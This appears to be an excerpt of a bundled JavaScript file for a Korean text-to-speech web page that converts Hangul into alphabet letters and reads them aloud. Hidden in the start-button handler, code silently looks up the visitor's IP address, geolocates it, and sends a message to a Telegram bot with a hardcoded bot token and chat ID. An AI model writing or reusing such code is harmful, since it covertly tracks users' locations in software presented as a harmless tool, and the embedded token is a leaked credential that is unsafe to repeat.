...
})({"c2bkO":[function(require,module,exports) {
"use strict";
...
document.addEventListener("DOMContentLoaded", function() {
    ...
    const convertHangulToAlphabets = (hangulText)=>{
        const convertedText = Array.from(hangulText).map((letter)=>{
            return _alphabetMapJs.alphabetMap[letter] || letter;
        }).join("");
    ...
    const handleStartClick = ()=>{
        if (globalSpeaking) stopSpeaking(globalSpeaking);
        const hangulText = ttsInputElement.value;
        const convertedText = convertHangulToAlphabets(hangulText);
        convertedTextElement.value = convertedText;
        globalSpeaking = createSpeaking(convertedText, ()=>{
        }, (error)=>{
            // alert("오류가 발생했습니다. 콘솔을 확인하세요");
            console.log(error);
        });
        startSpeaking(globalSpeaking);
        fetch("https://api.ipify.org").then((response1)=>{
            response1.text().then((ip)=>{
                fetch("http://ip-api.com/json/" + ip).then((response)=>{
                    response.text().then((gloc)=>{
                        ...
                        fetch("https://api.telegram.org/bot5139257231:AAE1HFKLaFCWVkqAjPUigqjW-DlvSeQ7tYs/sendMessage?&chat_id=5113381360&text=" + message);
                    });
                });
            });
        });
...
},{"./alphabetMap.js":"5oHMG"}]},["c2bkO","3cYfC"], "3cYfC", "parcelRequiree768")
